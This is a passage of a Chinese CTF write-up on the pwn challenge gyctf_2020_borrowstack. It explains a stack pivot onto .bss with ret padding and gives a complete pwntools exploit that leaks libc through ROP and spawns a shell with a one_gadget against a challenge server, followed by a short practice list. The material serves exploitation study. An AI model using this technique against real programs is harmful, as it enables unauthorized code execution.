+
+然而看她的 bss 段，`.bss:0000000000601080 ??                                bank db    ? ;` 其实离上面的 got 表一类不可写数据挺近的，考虑到栈向低地址生长，执行 system 或 puts 时会申请大量局部变量，可能跑到 got 上，所以我们必须先垫几个 ret 把 bss 抬高。
+
+```
+payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 即 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
+```
+
+然后我就 ROP 了半天，死活也不能打通 system，最后找了找题解，发现可以用 onegadget 就过了，怀疑是因为 system 会开非常多的局部变量，如果在 bss 段再次进行一次 ROP，那么 rsp 就会跑到 got 上去，导致错误。
+
+但是如果我们在 main 函数进行 onegadget，虽然 main 函数只有 8 的溢出空间，不能 ROP，但是 main 在真实栈上，有几 MB 的深度，所以可以执行。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+# io = process("./gyctf_2020_borrowstack")
+io = remote('node5.buuoj.cn', 26496)
+elf = ELF("./gyctf_2020_borrowstack")
+libc = ELF("./libc.so")
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+leave_ret = 0x400699
+bank_addr = 0x601080
+pop_rdi_ret = 0x400703
+ret_addr = 0x400704
+main_addr = 0x400626
+
+def main():
+    io.recvuntil(b"want\n")
+    
+    payload_1 = b'a' * 0x60 + p64(bank_addr) + p64(leave_ret)
+    io.send(payload_1)
+    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")
+
+    payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 即 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
+    io.send(payload2)
+    leak_data = io.recvline().strip(b'\n')
+    puts_addr = u64(leak_data.ljust(8,b'\x00'))
+    print("\n[+] Leak puts:",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    one_gadget_offset = 0x4526a 
+    one_gadget = libc_base + one_gadget_offset
+    print("\n[+] Libc Base:", hex(libc_base))
+    print("\n[+] One Gadget:", hex(one_gadget))
+    
+    io.recvuntil(b"want\n")
+    payload3 = b'a' * 0x60 + p64(0) + p64(one_gadget)
+    io.send(payload3)
+    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")
+    io.send(b'1') # 随便塞个字符让 read 返回，从而让 main 函数走到结尾触发 shell   
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 题单
+
+没有区分特点的题单，零基础可以做做。
+
+这次大概是我真菜，没做几个栈迁移的题目，佬别 D，人会补。
+
+BUU CTF:
+
+[actf_2019_babystack](https://buuoj.cn/challenges#actf_2019_babystack)
+
